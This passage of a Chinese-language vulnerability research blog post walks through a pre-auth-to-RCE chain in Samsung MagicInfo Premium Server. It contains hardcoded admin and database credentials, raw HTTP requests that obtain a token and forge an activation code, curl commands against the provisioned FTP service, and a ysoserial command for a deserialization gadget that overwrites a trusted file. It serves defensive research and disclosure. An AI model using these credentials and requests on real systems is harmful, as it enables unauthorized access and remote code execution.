/* */ private boolean canReadActivationCode = false;/* */ public CommonSettingService() {/* */ try {/* 82 */ this.canReadActivationCode = StrUtils.nvl(CommonConfig.get("saas.ac.enable")).equals("true");/* 83 */ } catch (ConfigException configException) {}/* */ }
```  
  
这是一个非默认设置，只在 Samsung 的云环境中使用；而且我没找到动态更新该配置的方式 (那会是个很有趣的 bug)。因此，在 C:/MagicInfo Premium/conf/config.properties  
里需要存在配置：saas.ac.enable = true  
。  
1. 最后一个障碍是：在   
2  
处检查当前登录用户是否拥有 Server Setup Manage  
权限。这意味着我们大概率需要一个 admin 用户才能完成整条链。  
  
说到这里我差点就放弃了：到目前为止我们已经拿到了拼图里的所有关键钥匙，所有请求也都是预认证的；但接下来的攻击链却需要"管理员认证 + 非默认配置"。我本来打算审计认证机制并尝试做认证绕过，但就算绕过了认证，非默认配置的问题仍然存在。唉！不过我这个人比较乐观，结果发现认证似乎没那么难，因为系统里有个有点"隐藏"的账号叫 orgadmin  
。网上完全没有任何文档提到它。我甚至用我那糟糕的 prompt 技巧去问了老朋友 AI，结果它们也说自己对此一无所知！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShGKur10CpBFYHxqVvfwHY5PFvMeHfAgVfwuLV67QzB8TIHJH6Z6cnpe65ac9476jT93ib8fBhWyTHBMZkHlgYggwMbGHJMvFs4/640?wx_fmt=png&from=appmsg "Grok 也不知道，免费的就是这样")  
  
事实证明，默认硬编码密码是 orgadmin2016  
。谁能猜到呢？不过我还是得确认一下，所以我可能……也可能没有……在外部验证过。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShJtBt3FQQSD3DbPA3zs3KYHRpyBX6Cl5wiblMUs5fpibvHhEtIYy5Hah1klSyscqV3nnPgTBMsE5HeNDUV8mHPgUWDVVb6ugGHY/640?wx_fmt=png&from=appmsg "这大概率是 AI 生成的假图")  
  
值得注意的是，在更新的版本 (也就是 21.1080.0  
及以上) 中，REST API 会在用户登录时默认强制启用 two factor。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSgpL1RVqRicNv6vowWhg1o9cTxAkq4SHibMKVvL8XCm2ia2gPzPo1mZBuwqW0jwLCKwJakNBpHNd8J5fvjsSYDHS55e1YqvAmQ8l0/640?wx_fmt=png&from=appmsg "强制双因子，不错的细节")  
  
不过，当我们通过 MagicInfoWebAuthorClient  
应用调用 MISLoginController  
时，就不需要提交任何 second factor。因此，构造 activation code 的流程大概是这样的。  
  
请求：  
```
POST /MagicInfoWebAuthorClient/main HTTP/1.1Host: [target]:7002Accept: application/jsonContent-Type: application/x-www-form-urlencodedContent-Length: 39username=orgadmin&password=orgadmin2016
```  
  
响应：  
```
HTTP/1.1 200 OKSet-Cookie: JSESSIONID=DC96A6C5E8C9E03B6FE1DDA9C647626E; Path=/MagicInfoWebAuthorClient; Secure; HttpOnlySet-Cookie: user=JGFkOGIwNDNkZmY1YzdmMjgkdA==; HttpOnlyCache-Control: no-storeContent-Type: application/json;charset=UTF-8Content-Language: enDate: Wed, 13 Aug 2025 05:38:52 GMTServer: MagicInfo Premium ServerContent-Length: 40{ "token":"JGFkOGIwNDNkZmY1YzdmMjgkdA=="}
```  
  
请求：  
```
POST /MagicInfo/openapi/open?service=CommonSettingService.addActivationInfo&organ_id=1&expired_date_str=2222-01-01&token=JGFkOGIwNDNkZmY1YzdmMjgkdA%3d%3d HTTP/1.1Host: [target]:7002Content-Type: application/x-www-form-urlencodedContent-Length: 0
```  
  
响应：  
```
HTTP/1.1 200 OK...Content-Type: text/xml;charset=UTF-8Content-Language: enContent-Length: 127Date: Wed, 13 Aug 2025 00:19:46 GMTServer: MagicInfo Premium Server<?xml version="1.0" encoding="UTF-8" ?><response code="0"> <responseClass class="String">1335518</responseClass></response>
```  
  
现在我们就有了一个有效的 activation_code  
。接下来，我们用这个 code 去请求 com.samsung.magicinfo.framework.monitoring.service.ActivationServiceActivity  
，并把 .MO.MONITORING_INFO.ACTIVATION.ACTIVATION_CODE  
的 mo_path  
设为这个有效值，这样就能 provision 出 FTP 账号并最终登录！  
```
steven@DESKTOP-DHOMH1S:~$ curl ftp://Xn-WG-Rq-5x-HW-Vl:05b574474312b0c6@192.168.18.136drwx------ 3 user group 0 Aug 12 01:04 HTTPWarningPagedrwx------ 3 user group 0 Aug 12 01:04 admindrwx------ 3 user group 0 Aug 12 01:05 capturedrwx------ 3 user group 0 Aug 12 01:05 contents_homedrwx------ 3 user group 0 Aug 12 01:12 evtdrwx------ 3 user group 0 Aug 12 01:12 facedrwx------ 3 user group 0 Aug 12 01:05 jnlpdrwx------ 3 user group 0 Aug 12 01:07 jobs_homedrwx------ 3 user group 0 Aug 12 01:05 mdddrwx------ 3 user group 0 Aug 12 01:05 mofilesdrwx------ 3 user group 0 Aug 12 01:12 popdrwx------ 3 user group 0 Aug 12 01:05 privacy_policydrwx------ 3 user group 0 Aug 12 01:05 scheduledrwx------ 3 user group 0 Aug 12 01:05 validationdrwx------ 3 user group 0 Aug 12 01:05 vwt
```  
  
顺便来个小彩蛋：你能猜到我为什么把 username 里塞了横杠 (dashes) 吗？  
## 利用  
  
仅仅创建一个 FTP 账号其实没什么用：除非 FTP server 存在可用的 traversal 读写，否则我们就只能原地干瞪眼。当然，除非我们能覆盖掉可信文件！在 com.samsung.magicinfo.protocol.compiler.util.Deserializer  
类里，我们能看到如下代码：  
```
/* */ public class Deserializer/* */ {/* */ public static MOTree getMOTree(String serializedMOTreeFilePath) throws Exception {/* 26 */ file = null;/* 27 */ input = null;/* */ try {/* 29 */ file = new FileInputStream(serializedMOTreeFilePath);/* 30 */ input = new ObjectInputStream(file);/* 31 */ MOTree moTree = (MOTree)input.readObject();/* 32 */ return moTree;/* 33 */ } catch (Exception e) {/* 34 */ throw e;/* */ } finally {/* 36 */ input.close();/* 37 */ file.close();/* */ }/* */ }/* *//* *//* */ public static MONodeConstraints getMONodeConstraints(String serializedMONodeConstraintsFilePath) throws Exception {/* 43 */ file = null;/* 44 */ input = null;/* */ try {/* 46 */ file = new FileInputStream(serializedMONodeConstraintsFilePath);/* 47 */ input = new ObjectInputStream(file);/* 48 */ MONodeConstraints moNodeConstraints = (MONodeConstraints)input.readObject();/* 49 */ return moNodeConstraints;/* 50 */ } catch (Exception e) {/* 51 */ throw e;/* */ } finally {/* 53 */ input.close();/* 54 */ file.close();/* */ }/* */ }/* */ }
```  
  
这是什么？对不可信数据进行反序列化？我收下了！看起来 com.samsung.magicinfo.protocol.repository.MORepository  
会调用 Deserializer  
的方法：  
```
/* */ private void loadModel(String model, Properties configProps) throws Exception {/* 291 */ String motAttr = null;/* 292 */ String mocAttr = null;/* 293 */ String motValue = null;/* 294 */ String mocValue = null;/* */ try {/* 299 */ if (configProps != null) {/* 300 */ motAttr = model + ".mot";/* 301 */ mocAttr = model + ".moc";/* 302 */ motValue = (String)configProps.get(motAttr);/* 303 */ mocValue = (String)configProps.get(mocAttr);/* */ }/* 306 */ else if (mofileBasePath != null) { // 1/* 307 */ String motFName = model + "_MO_TREE.BIN"; // 2/* 308 */ String mocFName = model + "_MO_CONSTRAINTS.BIN";/* 309 */ motValue = mofileBasePath + File.separator + model + File.separator + motFName; // 3/* 310 */ mocValue = mofileBasePath + File.separator + model + File.separator + mocFName;/* */ } else {/* 313 */ logger.error("--------------------------------------------------");/* 314 */ logger.error("MOTree load failed. model=" + model);/* 315 */ logger.error("--------------------------------------------------");/* */ return;/* */ }/* 319 */ if (motValue != null && mocValue != null && !motValue.trim().equals("") &&/* 320 */ !mocValue.trim().equals("")) {/* 327 */ MOTree moTree = Deserializer.getMOTree(motValue); // 4/* 329 */ MONodeConstraints moNodeConstraints = Deserializer.getMONodeConstraints(mocValue);/* 332 */ MOCompiledFile moCompiledFile = new MOCompiledFile();/* 333 */ moCompiledFile.moTree = moTree;/* 334 */ moCompiledFile.moNodeConstraints = moNodeConstraints;/* 336 */ moTreeMap.put(model, moCompiledFile);/* */ }/* 338 */ } catch (Exception e) {/* 339 */ logger.error("--------------------------------------------------");/* 340 */ logger.error("MOTree Loading of " + model + "Model Failed!!!");/* 341 */ logger.error("--------------------------------------------------");/* */ }/* */ }
```  
  
在   
1  
处，如果 mofileBasePath  
被设置，那么代码会走到   
2  
，并用 model  
值拼出 motFName  
。在   
3  
处路径被构造出来并保存到 motValue  
。最后在   
4  
处，用序列化文件路径调用 Deserializer.getMOTree  
。  
```
/* */ private void loadSingleMOConfig() {/* */ try {/* 378 */ if (CommonConfig.get("mo.files.upload.savepath") != null) {/* 379 */ mofileBasePath = CommonConfig.get("mo.files.upload.savepath"); // 5/* */ }/* *//* 382 */ //.../* 393 */ } catch (Exception ex) {/* 394 */ logger.error("load SingleMO Config failed !!!", ex);/* */ }/* */ }
```  
  
在   
5  
处，mofileBasePath  
来自 C:/MagicInfo Premium/conf/config.properties  
文件。默认值是 mo.files.upload.savepath=C:/MagicInfo Premium/runtime/upload/mofiles  
。默认 FTP root path 则是 C:/MagicInfo Premium/runtime/upload  
。一切终于串起来了！  
```
steven@DESKTOP-DHOMH1S:~$ curl ftp://Xn-WG-Rq-5x-HW-Vl:05b574474312b0c6@192.168.18.136/mofiles/Default/-rw------- 1 user group 1292 Jun 17 2024 AlarmInfo.xml-rw------- 1 user group 1787 Jun 17 2024 BasicInfo.xml-rw------- 1 user group 4032 Jun 17 2024 ConfInfo.xml-rw------- 1 user group 2172 Jun 17 2024 Default_MO_CONSTRAINTS.BIN-rw------- 1 user group 2773 Aug 12 22:04 Default_MO_TREE.BIN <--- we can target this file-rw------- 1 user group 23013 Jun 17 2024 DeviceConfInfo.xml-rw------- 1 user group 23892 Jun 17 2024 DisplayConfInfo.xml-rw------- 1 user group 1415 Jun 17 2024 FaultInfo.xml-rw------- 1 user group 1550 Jun 17 2024 LogInfo.xml-rw------- 1 user group 3663 Jun 17 2024 MONITOR_MO.xml-rw------- 1 user group 3001 Jun 17 2024 MONITOR_MO_SCHEMA.xsd-rw------- 1 user group 994 Jun 17 2024 MONITOR_TYPE_SCHEMA.xsd-rw------- 1 user group 11977 Jun 17 2024 MonitoringInfo.xml-rw------- 1 user group 8724 Jun 17 2024 Operation.xml-rw------- 1 user group 4846 Jun 17 2024 ScheduleInfo.xml
```  
  
这条代码路径会在构造 MORepository  
的新实例，或调用 refresh  
方法时触发；而它似乎只会在 Spring 应用启动时触发。为了拿到代码执行，攻击者可以用 java -jar ~/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 mspaint  
生成一个 Default_MO_TREE.BIN  
。但需要注意：他们得调整 pom.xml  
，让它使用 commons-beanutils-1.9.3  
和 commons-collections-3.2  
这两个库。  
## 提权 (Elevation of Privilege)  
  
别忘了，所有这些攻击也都可以在本地上下文 (local context) 里完成并导致提权，因为攻击者只需要用硬编码凭据 magicinfo:midb2016!  
登录数据库，然后注入一个自己可用的 FTP 账号，再把它 approve/provision 掉就行！非默认配置？管理员账号？……不需要。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiaw2WNY96JeAC23hEVBZyiaD4Yug8CsDco23yb6icuwdHvODFtX6zr2RicLZbtWpyZcvypFicwZpg6zlporEaKG8HGia3afh9lkcgrQ/640?wx_fmt=png&from=appmsg "默认硬编码数据库凭据")  
  
当然，你可能需要等机器重启，或者等管理员重启服务。  
## 概念验证 (Proof of Concept)  
  
你可以在 这里 下载 poc。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSjBhGaXJQ2z5rmH8x4053xPOw5LXttKIOcjQJzRkRibHzCaZqHu3wlIuMvYIOVPcQShoIyRiaVPny1fJfAKA463ZavUDzvjawosk/640?wx_fmt=png&from=appmsg "上传反序列化 gadget 并实现 RCE")  
## 总结  
  
感谢你坚持读到这里！如果你一路看下来没看到任何 memes，那就给自己鼓个掌吧，毕竟现在都 2026 年了。你可能会注意到这篇博客里有一些错误——那是我试图说服你"这不是 AI 写的"的努力，希望多少起了点作用！也请继续关注本系列的 part 2：我会在那里详细介绍一条不需要重启/重启 MagicInfoPremium  
服务的预认证 RCE 向量！  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
  
